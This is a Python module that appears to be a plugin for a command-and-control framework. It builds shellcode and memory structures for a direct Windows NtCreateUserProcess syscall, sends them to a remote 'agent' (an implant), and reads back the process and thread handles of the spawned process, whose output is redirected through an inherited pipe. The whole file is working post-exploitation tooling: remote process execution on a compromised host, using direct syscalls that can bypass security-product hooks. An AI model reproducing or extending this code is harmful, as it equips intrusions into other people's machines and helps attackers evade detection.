NAME = "NtCreateUserProcess"
DESCRIPTION = "Direct Syscall to spawn a process with redirected handles"
PARAMS = [
    {"name":"process_params_ptr", "description":"Pointer to initialized RTL_USER_PROCESS_PARAMETERS", "type":"hex"},
    {"name":"image_path", "description":"Full NT path to the binary", "type":"str"},
    {"name":"h_write_pipe", "description":"Handle to the output pipe to inherit", "type":"int"},
]

def NtCreateUserProcess(agent_id, p_params, image_path, h_pipe):
    from models.agent import Agent
    from models.syscall import Syscall
    from services.binary import build_ptr, to_unicode, push_syscall, build_ps_create_info, build_ps_attribute_list
    import struct
    
    agent = Agent.by_id(agent_id)
    syscall = Syscall.sys(agent.id, "NtCreateUserProcess")
    scratchpad = agent.scratchpad

    # Memory Layout for Syscall
    # 1. ProcessHandle (8)
    h_proc_data, h_thread_ptr = build_ptr(scratchpad, b"\x00" * 8)
    # 2. ThreadHandle (8)
    h_thread_data, image_str_ptr = build_ptr(h_thread_ptr, b"\x00" * 8)
    # 3. Unicode string for Attribute List (ImagePath)
    image_path_unicode = to_unicode(image_path)
    image_str_data, create_info_ptr = build_ptr(image_str_ptr, image_path_unicode)
    # 4. PS_CREATE_INFO (88)
    create_info_data, handle_array_ptr = build_ps_create_info(create_info_ptr)
    # 5. Handle Array for Attribute List (8)
    handle_array_data, attr_list_ptr = build_ptr(handle_array_ptr, struct.pack('<Q', h_pipe))
    # 6. PS_ATTRIBUTE_LIST (64)
    attr_list_data, next_ptr = build_ps_attribute_list(attr_list_ptr, image_str_ptr, len(image_path)*2, handle_array_ptr, 8)

    params = [
        scratchpad,      # P1: &ProcessHandle (R10)
        h_thread_ptr,    # P2: &ThreadHandle (RDX)
        0x1FFFFF,        # P3: PROCESS_ALL_ACCESS (R8)
        0x1FFFFF,        # P4: THREAD_ALL_ACCESS (R9)
        0x0,             # P5: [RSP+0x28] ObjectAttributes
        0x0,             # P6: [RSP+0x30] ObjectAttributes
        0x01,            # P7: [RSP+0x38] ProcessFlags (Inherit Handles)
        0x0,             # P8: [RSP+0x40] ThreadFlags
        p_params,        # P9: [RSP+0x48] Pointer to RTL_USER_PROCESS_PARAMETERS
        create_info_ptr, # P10:[RSP+0x50] Pointer to PS_CREATE_INFO
        attr_list_ptr    # P11:[RSP+0x58] Pointer to PS_ATTRIBUTE_LIST
    ]

    shellcode = push_syscall(syscall, params, agent.debug)
    data = h_proc_data + h_thread_data + image_str_data + create_info_data + handle_array_data + attr_list_data
    
    print(
    f"NtCreateUserProcess(\n"
    f"  P1  ProcessHandlePtr   = {hex(scratchpad)},\n"
    f"  P2  ThreadHandlePtr    = {hex(h_thread_ptr)},\n"
    f"  P3  ProcessAccess      = {hex(0x1FFFFF)},\n"
    f"  P4  ThreadAccess       = {hex(0x1FFFFF)},\n"
    f"  P5  ProcessObjectAttrs = {hex(0x0)},\n"
    f"  P6  ThreadObjectAttrs  = {hex(0x0)},\n"
    f"  P7  ProcessFlags       = {hex(0x01)},\n"
    f"  P8  ThreadFlags        = {hex(0x0)},\n"
    f"  P9  ProcessParameters  = {hex(p_params)},\n"
    f"  P10 CreateInfo         = {hex(create_info_ptr)},\n"
    f"  P11 AttributeList      = {hex(attr_list_ptr)}\n"
    f")"
    )
    return data, shellcode

def executeProcess(agent_id, p_params, image_path, h_pipe):
    from services.orders import write_scratchpad, send_and_wait, read_scratchpad
    
    data, shellcode = NtCreateUserProcess(agent_id, p_params, image_path, h_pipe)
    write_scratchpad(agent_id, data)
    
    # Execute the Syscall (0xAF)
    response_retval = int.from_bytes(send_and_wait(agent_id, shellcode), 'little')
    
    # Read back handles
    handles_raw = read_scratchpad(agent_id, 16)
    hProcess = int.from_bytes(handles_raw[:8], 'little')
    hThread = int.from_bytes(handles_raw[8:16], 'little')
    
    print(f"retval: {hex(response_retval)}, hProcess: {hex(hProcess)}, hThread: {hex(hThread)}")
    return response_retval, hProcess, hThread

def function(agent_id, args):
    # args: [p_params, image_path, h_pipe]
    retval, hProc, hThread = executeProcess(agent_id, args[0], args[1], args[2])
    return {
        "retval": retval, 
        "PROCESS_HANDLE": hProc, 
        "THREAD_HANDLE": hThread
    }